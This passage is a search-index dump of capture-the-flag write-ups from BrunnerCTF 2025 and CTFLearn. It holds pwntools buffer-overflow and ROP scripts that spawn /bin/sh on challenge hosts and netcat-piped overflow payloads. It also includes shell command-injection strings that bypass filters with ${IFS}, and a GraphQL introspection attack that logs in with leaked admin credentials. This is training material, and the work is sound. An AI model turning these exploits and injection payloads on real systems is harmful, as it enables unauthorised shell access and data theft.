assembler dump.\n</code></pre> <p>Buffer of length 0x10</p> <pre><code>(gdb) disas secret_dough_recipe \nDump of assembler code for function secret_dough_recipe:\n   0x00000000004011b6 &lt;+0&gt;: endbr64\n</code></pre> <p>Test it locally:</p> <pre><code>from pwn import *\n\nRECIPE_BUFFER_SIZE = 0x10\nRBP_SIZE = 0x8\nSECRET_ADDRESS = 0x00000000004011b6\nPROMPT = \"\"\n\nUSE_REMOTE = False\nREMOTE_HOST = \"\"\nREMOTE_PORT = 0\n\nif USE_REMOTE:\n    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)\nelse:\n    e = ELF(\"./recipe\")\n    io = e.process()\n\npayload = b\"A\" * RECIPE_BUFFER_SIZE\npayload += b\"B\" * RBP_SIZE\npayload += p64(SECRET_ADDRESS)\n\nio.recvuntil(PROMPT.encode())\nio.sendline(payload)\nio.interactive()\n</code></pre> <p>Set <code>USE_REMOTE</code>, <code>REMOTE_HOST</code>, <code>REMOTE_PORT</code> to run it remotely and get the flag</p>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/DoughBot/","title":"DoughBot","text":"<p>Forensics</p> <pre><code>Our state-of-the-art smart mixer, DoughBot, crashed during a routine kneading cycle. Luckily, a technician was monitoring the device over UART and captured the memory output just before the reboot.\n\nAnalyze the captured dump and see what the DoughBot was trying to say before it rebooted.\n</code></pre> <p>points: <code>20</code></p> <p>solves: <code>704</code></p> <p>author: <code>rvsmvs</code></p> <p>We are provided with a file: <code>doughbot_dump.bin</code></p> <p>It contains a line: <code>// dev.note: bootlog_flag=YnJ1bm5lcnttMXgzZF9zMWduYWxzXzRfc3VyZX0=</code></p> <p>Decoding (<code>echo \"YnJ1bm5lcnttMXgzZF9zMWduYWxzXzRfc3VyZX0\" | base64 -d</code>) gives the flag</p>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Online%20Cake%20Flavour%20Shop/","title":"Online Cake Flavour Shop","text":"<p>Pwn</p> <pre><code>Brunnerne made an online flavour shop! Your wildest dreams can be fulfilled, it's actually hard to WRAP your head AROUND how amazing this software is!\n</code></pre> <p>points: <code>40</code></p> <p>solves: <code>476</code></p> <p>author: <code>olexmeister</code></p> <p>We are given a C file <code>shop.c</code>:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define FLAG_COST 100\n#define BRUNNER_COST 10\n#define CHOCOLATE_COST 7\n#define DR\u00d8MMEKAGE_COST 5\n\n\nint buy(int balance, int price) {\n    int qty;\n    printf(\"How many? \");\n    scanf(\"%u\", &amp;qty);\n\n    int cost = qty * price;\n    printf(\"price for your purchase: %d\\n\", cost);\n\n    if (cost &lt;= balance) {\n        balance -= cost;\n        printf(\"You bought %d for $%d. Remaining: $%d\\n\", qty, cost, balance);\n    } else {\n        printf(\"You can't afford that!\\n\");\n    }\n\n    return balance;\n}\n\nvoid menu() {\n    printf(\"\\nMenu:\\n\");\n    printf(\"1. Sample cake flavours\\n\");\n    printf(\"2. Check balance\\n\");\n    printf(\"3. Exit\\n\");\n    printf(\"&gt; \");\n}\n\nunsigned int flavourMenu(unsigned int balance) {\n    unsigned int updatedBalance = balance;\n\n    printf(\"\\nWhich flavour would you like to sample?:\\n\");\n    printf(\"1. Brunner ($%d)\\n\", BRUNNER_COST);\n    printf(\"2. Chocolate ($%d)\\n\", CHOCOLATE_COST);\n    printf(\"3. Dr\u00f8mmekage ($%d)\\n\", DR\u00d8MMEKAGE_COST);\n    printf(\"4. Flag Flavour ($%d)\\n\", FLAG_COST);\n    printf(\"&gt; \");\n\n    int choice;\n    scanf(\"%d\", &amp;choice);\n\n    switch (choice)\n    {\n    case 1:\n        updatedBalance = buy(balance, BRUNNER_COST);\n        break;\n    case 2:\n        updatedBalance = buy(balance, CHOCOLATE_COST);\n        break;\n    case 3:\n        updatedBalance = buy(balance, DR\u00d8MMEKAGE_COST);\n        break;\n    case 4:\n        unsigned int flagBalance;\n        updatedBalance = buy(balance, FLAG_COST);\n        if (updatedBalance &gt;= FLAG_COST) {\n            // Open file and print flag\n            FILE *fp = fopen(\"flag.txt\", \"r\");\n            if(!fp) {\n                printf(\"Could not open flag file, please contact admin!\\n\");\n                exit(1);\n            }\n            char file[256];\n            size_t readBytes = fread(file, 1, sizeof(file), fp);\n            puts(file);\n        }\n        break;\n    default:\n        printf(\"Invalid choice.\\n\");\n        break;\n    }\n\n    return updatedBalance;\n}\n\nint main() {\n    int balance = 15;\n    int choice;\n\n    printf(\"Welcome to Overflowing Delights!\\n\");\n    printf(\"You have $%d.\\n\", balance);\n\n    while (1) {\n        menu();\n        scanf(\"%d\", &amp;choice);\n\n        switch (choice)\n        {\n        case 1:\n            balance = flavourMenu(balance);\n            break;\n        case 2:\n            printf(\"You have $%d.\\n\", balance);\n            break;\n        case 3:\n            printf(\"Goodbye!\\n\");\n            exit(0);\n            break;\n        default:\n            printf(\"Invalid choice.\\n\");\n            break;\n        }\n    }\n    return 0;\n}\n</code></pre> <p>We need to buy the flag (cost = 100) with our balance (15)</p> <p><code>buy()</code> function also takes <code>qty</code> as input which is then multiplied by <code>price</code> before comparing with <code>balance</code> \\ If <code>qty</code> = INT_MAX (2147483647) is provided, <code>qty*100</code> evaluates to -100, because of integer overflow wrap-around, this satisfies the condition of being less than balance and hhence flag is printed</p>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Shaken%2C%20Not%20Stirred/","title":"Shaken, Not Stirred","text":"<pre><code>After all that cake, I think it's time to sit back, relax, and have a drink \ud83c\udf78 One vodka martini, please - shaken, not stirred of course!\n\n...Aw man, I just saw the bartender add something strange, I just wanted a good old classic. Wonder if I can demix it and get it out \ud83e\udd14\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>316</code></p> <p>author: <code>Nissen</code></p> <p>Given <code>encrypt.py</code>:</p> <pre><code>import random\nimport sys\nimport time\n\n### HELPER FUNCTIONS - IGNORE ###\ndef shake():\n    time.sleep(0.5)\n    for i in range(15):\n        sys.stdout.write(f\"    {' ' * (i % 3)}\ud83e\ude87 Shaking \ud83e\ude87\")\n        sys.stdout.flush()\n        time.sleep(0.1)\n        sys.stdout.write(\"\\b\" * 20)\n        sys.stdout.write(\" \" * 20)\n        sys.stdout.write(\"\\b\" * 20)\n\ndef printer(s):\n    time.sleep(0.5)\n    print(s)\n\n\n### PROGRAM ###\nprinter(\"\ud83c\udf78 Welcome to the Martini MiXOR 3000! \ud83c\udf78\\n\")\n\ningredients = [\n    \"\ud83e\uded7 Vodka\",\n    \"\ud83c\udf7e Dry Vermouth\",\n    \"\ud83e\uded9 Olive Brine\",\n    \"\ud83e\uded2 Olive\",\n    \"\ud83e\udd62 Toothpick\",\n]\n\nprinter(\"Adding ingredients to the shaker...\")\nshaker = 0\nfor ingredient in ingredients:\n    # Mix ingredients together\n    shaker ^= len(ingredient) * random.randrange(18)\n    printer(f\"  {ingredient}\")\n\nprinter(\"  \ud83c\udffa Secret ingredient\\n\")\nwith open(\"flag.txt\", \"rb\") as f:\n    secret = f.read().strip()\ndrink = bytes([b ^ shaker for b in secret])\n\n# Shake well!\nshake()\nshake()\nshake()\n\nif all(32 &lt; d &lt; 127 for d in drink):\n    printer(\"Drink's ready! Shaken, not stirred:\")\n    printer(f\"\ud83c\udf78 {drink.decode()} \ud83c\udf78\")\nelse:\n    printer(\"\ud83e\uded7 Oops! Shook your drink too hard and spilled it \ud83e\uded7\")\n</code></pre> <p>Given <code>output.txt</code>:</p> <pre><code>\ud83c\udf78 Welcome to the Martini MiXOR 3000! \ud83c\udf78\n\nAdding ingredients to the shaker...\n  \ud83e\uded7 Vodka\n  \ud83c\udf7e Dry Vermouth\n  \ud83e\uded9 Olive Brine\n  \ud83e\uded2 Olive\n  \ud83e\udd62 Toothpick\n  \ud83c\udffa Secret ingredient\n\nDrink's ready! Shaken, not stirred:\n\ud83c\udf78 wg`{{pgna}&amp;J{!x&amp;2fJWg`{{&amp;g;;;_!x&amp;fJWg`{{&amp;gh \ud83c\udf78\n</code></pre> <p>Create <code>decrypt.py</code></p> <pre><code>import random\n\ningredients = [\n    \"\ud83e\uded7 Vodka\",\n    \"\ud83c\udf7e Dry Vermouth\",\n    \"\ud83e\uded9 Olive Brine\",\n    \"\ud83e\uded2 Olive\",\n    \"\ud83e\udd62 Toothpick\"\n]\n\nwhile True:\n    shaker = 0\n    for ingredient in ingredients:\n        shaker ^= len(ingredient) * random.randrange(18)\n\n    secret = b\"wg`{{pgna}&amp;J{!x&amp;2fJWg`{{&amp;g;;;_!x&amp;fJWg`{{&amp;gh\"\n    drink = bytes([b ^ shaker for b in secret])\n\n    if all(32 &lt; d &lt; 127 for d in drink):\n        flag = drink.decode()\n        if \"brunner{\" in flag:\n            print(flag)\n            break\n</code></pre>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/The%20Great%20Mainframe%20Bake-Off/","title":"The Great Mainframe Bake-Off","text":"<p>Misc</p> <pre><code>It's 1974. Deep inside the crusty vaults of CrumbTrust Bank, a covert team of COBOL developers and pastry chefs created a failsafe for their most prized possession: The Marzipan Reverse Recipe.\n\nThis sacred document was too valuable to be stored on paper. So, they did the unthinkable - they encoded it and buried it in the production mainframe under a fake batch job titled IEBCAKED. Only those with knowledge of both banking ops and baking science could ever retrieve it.\n\nYears later, the IEBCAKED job has mysteriously reappeared in the job output spool of an IBM z/OS LPAR. But what's left is a string of mysterious byte codes. It's clearly not hex, not ASCII... maybe something older... something only the graybeards of computing would recognize.\n\nCan you decipher the original recipe and unlock the secret to the perfect butterbyte tart?\n\nd0-85-97-89-83-85-d9-6d-85-a2-99-85-a5-85-d9-6d-95-81-97-89-a9-99-81-d4-6d-85-88-e3-6d-a2-c9-6d-a2-89-88-e3-6d-84-95-c1-6d-a2-85-94-81-99-c6-95-89-81-d4-6d-95-d6-6d-f0-f7-f9-f1-6d-85-88-e3-6d-95-c9-6d-84-85-a2-e4-6d-a2-81-e6-6d-c3-c9-c4-c3-c2-c5-c0-99-85-95-95-a4-99-82\n</code></pre> <p>points: <code>30</code></p> <p>solves: <code>582</code></p> <p>author: <code>H4N5</code></p> <pre><code>hex_str = \"d0-85-97-89-83-85-d9-6d-85-a2-99-85-a5-85-d9-6d-95-81-97-89-a9-99-81-d4-6d-85-88-e3-6d-a2-c9-6d-a2-89-88-e3-6d-84-95-c1-6d-a2-85-94-81-99-c6-95-89-81-d4-6d-95-d6-6d-f0-f7-f9-f1-6d-85-88-e3-6d-95-c9-6d-84-85-a2-e4-6d-a2-81-e6-6d-c3-c9-c4-c3-c2-c5-c0-99-85-95-95-a4-99-82\"\ndata = bytes.fromhex(hex_str.replace(\"-\", \"\"))\ns = data.decode(\"cp500\")\nprint(s)\nprint(s[::-1])\n</code></pre>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/The%20Secret%20Brunsviger/","title":"The Secret Brunsviger","text":"<p>Forensics</p> <pre><code>I have intercepted encrypted HTTPS traffic from the secret brunsviger baking forum, but I need help decrypting it.\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>242</code></p> <p>author: <code>Ha1fdan</code></p> <p><code>traffic.pcap</code> and <code>keys.log</code> given:</p> <p>Open Wireshark to observe the pcap file:</p> <p></p> <p>In Preferences, set TLS keys using the log file given. Now Application Data is visible:</p> <p></p> <p>The JSON packets seem interesting...</p> <p></p> <p>Decode (base64) the secret recipe to get the flag</p>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Where%20Robots%20Cannot%20Search/","title":"Where Robots Cannot Search","text":"<p>Web</p> <pre><code>Ahh, the Brunnerne company.\nBut they have a secret, hidden away from robot search.\n</code></pre> <p>points: <code>30</code></p> <p>solves: <code>755</code></p> <p>author: <code>The Mikkel</code></p> <p>At <code>/robots.txt</code>:</p> <pre><code>ser-agent: *\nDisallow: /admin\nDisallow: /private\nDisallow: /hidden\nDisallow: /flag.txt\n</code></pre> <p>Flag at <code>/flag.txt</code></p>"},{"location":"BrunnerCTF%202025/Shake%20%26%20Bake%20%28Beginner%29/Whisk/","title":"Whisk","text":"<p>Crypto</p> <pre><code>Someone tried sabotaging our operation by \"whisking\u201d away the secret ingredient for the perfect brunsviger. All that's left on the workbench is this sticky note full of pastry-themed symbols and random letters.\n\nCan you help us recover the secret ingredient?\n</code></pre> <p>points: <code>40</code></p> <p>solves: <code>313</code></p> <p>author: <code>rvsms</code></p> <p><code>whisk.txt</code>:</p> <pre><code>DR\ud83e\udd50 C\ud83e\udd50TZ\ud83e\udd50D \ud83e\uddc1SXZ\ud83e\udd50A\ud83e\uddc1\ud83e\udd50SD \ud83e\uddc1C \ud83c\udf70KE\ud83c\udf70FC K\ud83c\udf69M\ud83e\udd50. D\ud83c\udf69 O\ud83c\udf70Q\ud83e\udd50 \ud83c\udf70 Y\ud83e\udd50ZP\ud83e\udd50TD\nOZ\ud83e\udd56SCM\ud83e\uddc1X\ud83e\udd50Z, H\ud83e\udd50KD O\ud83e\udd56DD\ud83e\udd50Z E\ud83e\uddc1DR OZ\ud83c\udf69ES C\ud83e\udd56X\ud83c\udf70Z, Y\ud83c\udf69\ud83e\udd56Z \ud83e\uddc1D \ud83c\udf69M\ud83e\udd50Z DR\ud83e\udd50 E\ud83c\udf70ZH\nA\ud83c\udf69\ud83e\udd56XR, \ud83c\udf70SA K\ud83e\udd50D DR\ud83e\udd50 CFZ\ud83e\udd56Y C\ud83e\udd50\ud83e\udd50Y \ud83e\uddc1SD\ud83c\udf69 \ud83e\udd50M\ud83e\udd50ZF T\ud83c\udf69ZS\ud83e\udd50Z. D\ud83c\udf70CD\ud83e\udd50, CH\ud83e\uddc1K\ud83e\udd50,\n\ud83c\udf70SA Z\ud83e\udd50H\ud83e\udd50HO\ud83e\udd50Z: CR\ud83c\udf70Z\ud83e\uddc1SX Y\ud83c\udf70CDZF N\ud83c\udf69F \ud83e\uddc1C H\ud83c\udf70SA\ud83c\udf70D\ud83c\udf69ZF.\nOZ\ud83e\udd56SS\ud83e\udd50Z{S0_H0Z3_K\ud83e\udd56HYF_T1YR3Z}\n</code></pre> <p>This is clearly a Substitution Cipher problem. Start with replacing \"OZ\ud83e\udd56SS\ud83e\udd50Z{\" with \"BUNNER{\", then try to replace characters to make valid English words</p> <pre><code>sub_map = {\n    'O': 'B',\n    'Z': 'R',\n    '\ud83e\udd56': 'U',\n    'S': 'N',\n    '\ud83e\udd50': 'E'\n}\n\nwith open(\"whisk.txt\", \"r\", encoding=\"utf-8\") as f:\n    content = f.read()\n\nnew_content = \"\"\nfor e in content:\n    if e in sub_map:\n        new_content += sub_map[e]\n    else:\n        new_content += e.lower()\n\nprint(new_content)\n</code></pre> <p>Keep adding to the <code>sub_map</code> and re-running till flag is deciphered</p> <pre><code>sub_map = {\n    'O': 'B',\n    'Z': 'R',\n    '\ud83e\udd56': 'U',\n    'S': 'N',\n    '\ud83e\udd50': 'E',\n    'H': 'M',\n    'D': 'T',\n    'C': 'S',\n    'R': 'H',\n    'T': 'C',\n    '\ud83e\uddc1': 'I',\n    'Y': 'P',\n    'X': 'G',\n    'K': 'L',\n    'A': 'D',\n    'E': 'W',\n    'F': 'Y'\n}\n</code></pre>"},{"location":"BrunnerCTF%202025/Web/Baking%20Bad/","title":"Baking Bad","text":"<pre><code>This new kid on the block, Bake'n'berg, has taken over the market with some new dough that has 99.2% purity. Ours is not even 60%!\n\nOur bakers have been trying to come up with a new P2P-recipe trying all sorts of weird ingredients to raise the purity, but it's so costly this way.\n\nLuckily, the developers at Brunnerne have come up with a bash -c 'recipe' that can simulate the baking process. This way we can test ingredients in a simulator to find ingredients that result in a higher purity - without wasting any ressources.\n</code></pre> <p>points: <code>100</code></p> <p>solves: <code>339</code></p> <p>author: <code>0xjeppe</code></p> <p>From the description, it is clear that this is a Command Injection problem</p> <p></p> <p>Going to <code>/quality.sh</code>:</p> <pre><code>#!/bin/sh\ningredient=\"$1\"\n[ -z \"$ingredient\" ] &amp;&amp; { echo \"No ingredient!\"; exit 1; }\n\npurity=$(awk -v s=\"$RANDOM\" 'BEGIN{srand(s);printf \"%.1f\",80+20*rand()}')\necho \"Ingredient: $ingredient\"\necho \"Purity: $purity%\"\n</code></pre> <p>After a few tries, we get to know that <code>space</code>, <code>/</code>, <code>\\</code> are Illegal characters</p> <p><code>space</code> can be replaced by <code>${IFS}</code></p> <pre><code>sugar;cd${IFS}..;cd${IFS}..;cd${IFS}..;ls\nIngredient: sugar\nPurity: 93.5%\nbin\nboot\ndev\netc\nflag.txt\nhome\nlib\nlib.usr-is-merged\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n</code></pre> <p>Yay flag.txt! But <code>cat</code> is an Illegal command, so we use <code>head</code></p> <pre><code>sugar;cd${IFS}..;cd${IFS}..;cd${IFS}..;head${IFS}flag.txt\nIngredient: sugar\nPurity: 83.1%\nbrunner{d1d_1_f0rg37_70_b4n_s0m3_ch4rz?}\n</code></pre>"},{"location":"BrunnerCTF%202025/Web/Brunner%27s%20Bakery/","title":"Brunner's Bakery","text":"<pre><code>Recent Graphs show that we need some more Quality of Life recipes! Can you go check if the bakery is hiding any?!\n</code></pre> <p>points: <code>100</code></p> <p>solves: <code>315</code></p> <p>author: <code>Quack</code></p> <p></p> <p>So, this could be a GraphQL Injection problem</p> <p>Using the following payload from PayloadsAllTheThings:</p> <pre><code>payload = {\n  \"query\": \"\"\"\n    query {\n      __schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}\n    }\n    \"\"\"\n}\n</code></pre> <p>In the response, we notice <code>secretRecipes</code>. Trying the payload similar to the <code>publicRecipes</code> one:</p> <pre><code>payload = {\n  \"query\": \"\"\"\n    query {\n      secretRecipes {\n        name\n        description\n        author {\n          displayName\n        }\n        ingredients {\n          name\n        }\n      }\n    }\n    \"\"\"\n}\n</code></pre> <p>But we get 'Access denied. admin only' error :(</p> <p>There is a <code>login</code> function (mutation) as seen in the schema output; it requires username and password</p> <p>Let's try the interesting fields of the Recipe, User, Ingredient types (found from the schema output)</p> <pre><code>payload = {\n  \"query\": \"\"\"\n    query {\n      publicRecipes {\n        name\n        description\n        author {\n          id\n          username\n          displayName\n          email\n          notes\n          privateNotes\n        }\n        ingredients {\n          name\n        }\n      }\n    }\n    \"\"\"\n}\n</code></pre> <p>The output contains <code>'notes': 'TODO: Remove temporary credentials... brunner_admin:Sw33tT00Th321?'</code></p> <p>We have the username and password now</p> <pre><code>import requests\n\nurl = \"https://brunner-s-bakery.challs.brunnerne.xyz/graphql\"\n\npayload = {\n    \"query\": \"\"\"\n    query {\n      secretRecipes {\n        name\n        description\n        author {\n          id\n          username\n          displayName\n          email\n          notes\n          privateNotes\n        }\n        ingredients {\n          name\n          supplier {\n            name\n            owner {\n              id\n              username\n              displayName\n              email\n              notes\n              privateNotes\n            }\n          }\n        }\n      }\n    }\n    \"\"\"\n}\n\npayload = {\n    \"query\": \"\"\"\n    mutation {\n      login(username: \"brunner_admin\", password: \"Sw33tT00Th321?\") {\n        token\n        user {\n          id\n          username\n        }\n      }\n    }\n    \"\"\"\n}\n\nheaders = {\n    \"Content-Type\": \"application/json\",\n}\n\nresponse = requests.post(url, json=payload, headers=headers)\ntoken = response.json()[\"data\"][\"login\"][\"token\"]\nheaders = {\"Content-Type\": \"application/json\", \"Authorization\": f\"Bearer {token}\"}\n\npayload = {\n    \"query\": \"\"\"\n    query {\n      secretRecipes {\n        name\n        description\n        author {\n          id\n          username\n          displayName\n          email\n          notes\n          privateNotes\n        }\n        ingredients {\n          name\n          supplier {\n            name\n            owner {\n              id\n              username\n              displayName\n              email\n              notes\n              privateNotes\n            }\n          }\n        }\n      }\n    }\n    \"\"\"\n}\n\nresponse = requests.post(url, json=payload, headers=headers)\n\ntry:\n    print(response.json())\nexcept Exception:\n    print(response.text)\n</code></pre> <p>Note: <code>secretRecipes</code> turned out to be a red herring. The payload of <code>publicRecipes</code>, with ingredient fields expanded, also exposes the flag:</p> <pre><code>payload = {\n    \"query\": \"\"\"\n    query {\n      publicRecipes {\n        name\n        description\n        author {\n          id\n          username\n          displayName\n          email\n          notes\n          privateNotes\n        }\n        ingredients {\n          name\n          supplier {\n            name\n            owner {\n              id\n              username\n              displayName\n              email\n              notes\n              privateNotes\n            }\n          }\n        }\n      }\n    }\n    \"\"\"\n}\n</code></pre>"},{"location":"CTFLearn/Binary/1010/","title":"Simple bof","text":"<p>Run <code>nc thekidofarcrania.com 35235</code> to observe the interface and IO \\ Run <code>cat bof.c</code> to observe the source code</p> <p>Observations:</p> <ol> <li>There is a <code>secret</code> variable whose value is <code>0xdeadbeef</code> which matches (reverse ('cause STACK) of) the red part of the visualization. This indicates the buffer has to be overflowed precisely to reach and modify the red part.</li> <li>In the source code, <code>secret</code> is compared with <code>0x67616c66</code>, which is <code>galf</code> in ASCII, so we have to end the buffer overflow with <code>flag</code>.</li> <li>On prompt at interface, enter any ASCII character 48 times, followed by \"flag\", e.g., <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag</code></li> </ol>"},{"location":"CTFLearn/Binary/1011/","title":"RIP my bof","text":"<p>The program outputs the stack before and after input; from this we can easily see that return address from vuln() is stored 60 bytes from input buffer \\ GDB ./server -&gt; <code>info functions</code> -&gt; win() is at 0x08048586</p> <pre><code>echo -n -e \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x86\\x85\\x04\\x08\\n\" | nc thekidofarcrania.com 4902\n</code></pre>"},{"location":"CTFLearn/Binary/1012/","title":"Shell time!","text":"<p>Previous problem</p> <p>Return Oriented Programming (ROP)</p> <pre><code>from pwn import *\n\ncontext.binary = './server'\nelf = context.binary\n\np = remote('thekidofarcrania.com', 4902)\n# p = process('./server')\n\ns = p.recvuntil(b'Input some text: ')\naddr = str(s.split(b'\\n')[4].split(b' ')[0])[2:-1] # starting address of buffer\n\n# 60 bytes of junk (as in prev problem) + system address + 0 (exit) + address of \"/bin/sh\" string + \"/bin/sh\" string\npayload = b'A'*60 + p32(elf.plt.system) + p32(0) + p32(int(addr, 16)+72) + b'/bin/sh'\n\np.sendline(payload)\np.interactive()\n</code></pre>"},{"location":"CTFLearn/Binary/1221/","title":"Leak me","text":"<p>Exactly like this challenge</p>"},{"location":"CTFLearn/Binary/1222/","title":"Domain name resolver","text":"<pre><code>strings task\n</code></pre> <pre><code>.\n.\nEnter the hostname to be resolved: \ndig %s +short\n:*3$\"\n.\n.\n</code></pre> <p>CMDi may be possible</p> <p>Input: <code>; ls; ls</code> Command executed: <code>dig; ls; ls +short</code> We get a dig output, then a list of files (run, flag.txt) in the directory, and \"ls: cannot access '+short': No such file or directory\"</p> <p>Input: <code>; cat flag.txt; ls</code></p>"},{"location":"CTFLearn/Binary/1232/","title":"Accumulator","text":"<p>Exactly like this challenge</p>"},{"location":"CTFLearn/Binary/1233/","title":"Positive Challenge","text":"<p>Range of short: -32768 to 32767 \\</p> <p>Input -32768; <code>n  = abs(n)</code> will result in an overflow and hence negative n</p>"},{"location":"CTFLearn/Binary/1246/","title":"Glob","text":"<p>Packed Structures</p> <p>GDB -&gt; disas main:</p> <pre><code>.\n.\n0x00000000004012ba &lt;+104&gt;:  call   0x4010c0 &lt;printf@plt&gt;\n0x00000000004012bf &lt;+109&gt;:  lea    rax,[rip+0x2dda]        # 0x4040a0 &lt;program_data+32&gt;\n0x00000000004012c6 &lt;+116&gt;:  mov    QWORD PTR [rip+0x2df3],rax        # 0x4040c0 &lt;program_data+64&gt;\n0x00000000004012cd &lt;+123&gt;:  mov    edx,0x21\n0x00000000004012d2 &lt;+128&gt;:  lea    rax,[rip+0x2dc7]        # 0x4040a0 &lt;program_data+32&gt;\n0x00000000004012d9 &lt;+135&gt;:  mov    rsi,rax\n0x00000000004012dc &lt;+138&gt;:  mov    edi,0x0\n0x00000000004012e1 &lt;+143&gt;:  call   0x4010d0 &lt;read@plt&gt;\n.\n.\n</code></pre> <p><code>program_data.message</code> is at 0x4040c0 \\ <code>program_data.username</code> is at 0x4040a0 \\ <code>program_data.flag</code> must be at 0x404080</p> <p>The <code>read()</code> accepts 33 bytes but <code>username[]</code> is just 32 bytes, so 1 byte of <code>message</code> can be overwritten so that it points to <code>flag[]</code>:</p> <pre><code>echo -n -e \"hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh\\x80\" | nc rivit.dev 10022\n</code></pre>"},{"location":"CTFLearn/Binary/1514/","title":"secret","text":"<p>Smart bruteforcing...</p> <pre><code>from pwn import *\n\nwhile True:\n    r = remote(\"rivit.dev\", 10026)\n    r.sendline(b'aa\\0')\n    s = r.recvline()\n    r.close()\n    print(s)\n    if s != b'No flag for you!\\n':\n        break\n</code></pre>"},{"location":"CTFLearn/Binary/391/","title":"Favorite Color","text":"<ol> <li>Check the source code. Clearly no input can make <code>good</code> true. Let's make the program skip the check.</li> <li>GDB -&gt; <code>disas main</code> -&gt; instruction after the jump je: 0x08048657</li> <li><code>b *vuln+34</code>, <code>run</code>, enter a long string of a's</li> <li>On hitting the breakpoint:<ul> <li><code>i f</code> -&gt; ebp is at 0xff89d8f8</li> <li><code>x/100xg $ebp-200</code> -&gt; input buffer starts at 0xff89d8c8 = ebp-0x30 = ebp-48</li> <li>return address is stored at ebp+4</li> </ul> </li> <li> <p>Enter 52 bytes of gibberish and then desired return address (take care of endianness):</p> <p><code>shell (python -c \"print('a'*52 + '\\x57\\x86\\x04\\x08')\"; cat) | ./color</code></p> </li> </ol> <p>The above spawns shell successfully, executing <code>cat flag.txt</code> should give the flag. If you encounter an error \"Cannot fork\", just kill all the \"/bin/sh\" processes: <code>ps aux | awk '$11 == \"/bin/sh\" {print $2}'</code>, and then run the exploit again</p>"},{"location":"CTFLearn/Binary/401/","title":"Blackbox","text":"<p>Permissions for blackbox executable are: ---x--s--x \\ So, no gdb, no xxd, nothing. The only thing allowed is to execute the binary</p> <pre><code>blackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox \nWhat is 1 + 1 = 2\nNo dummy... 1 + 1 != 0...\nblackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox \nWhat is 1 + 1 = 2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222\nNo dummy... 1 + 1 != 842150450...\n*** stack smashing detected ***: &lt;unknown&gt; terminated\n\n[4]+  Stopped                 ./blackbox\n</code></pre> <p>842150450 = 0x32323232, and 0x32 = 50 = ASCII value of '2'</p> <p>So, we need to overflow the buffer to the precise amount so that result becomes 2 (= 0x2)</p> <pre><code>blackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox \nWhat is 1 + 1 = 22222222222222222222222222222222222222222222222222222222222222222222222222     \nNo dummy... 1 + 1 != 0...\nblackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox \nWhat is 1 + 1 = 22222222222222222222222222222222222222222222222222222222222222222222222222222222222\nNo dummy... 1 + 1 != 3289650...\nblackbox@ubuntu-512mb-nyc3-01:~$ ./blackbox \nWhat is 1 + 1 = 222222222222222222222222222222222222222222222222222222222222222222222222222222222     \nNo dummy... 1 + 1 != 50...\n</code></pre> <p>Got it!</p> <pre><code>blackbox@ubuntu-512mb-nyc3-01:~$ echo -n -e \"22222222222222222222222222222222222222222222222222222222222222222222222222222222\\x02\" | ./blackbox \n</code></pre>"},{"location":"CTFLearn/Binary/691/","title":"Lazy Game Challenge","text":"<p>Python Script:</p> <pre><code>from pwn import *\n\nconn = remote(\"thekidofarcrania.com\", 10001)\n\nconn.recvuntil(b\"Are you ready? Y/N :\")\n\nconn.sendline(b\"Y\")\nconn.sendline(b\"-1000000\")  # 500 - (-1000000) = 1000500 (subtraction on losing)\nconn.recvuntil(b\"The Game is On, Good Luck !..\")\n\nguesses = b\"11\\n\" * 10  # Lose 10 times\nconn.send(guesses)\n\nwhile True:\n    data = conn.recvline().decode()\n    if \"flag\" in data:\n        print(data)\n        break    \n</code></pre>"},{"location":"CTFLearn/Cryptography/115/","title":"Character Encoding","text":"<p>Convert the given string from Hex to ASCII:</p> <pre><code>echo \"&lt;given-string&gt;\" | xxd -r -p\n</code></pre>"},{"location":"CTFLearn/Cryptography/120/","title":"RSA Noob","text":"<pre><code>e: 1\nc: 9327565722767258308650643213344542404592011161659991421\nn: 245841236512478852752909734912575581815967630033049838269083\n</code></pre> <p>RSA Intro here</p> <pre><code>c = (m^e)%n\ne = 1 -&gt; c = m%n 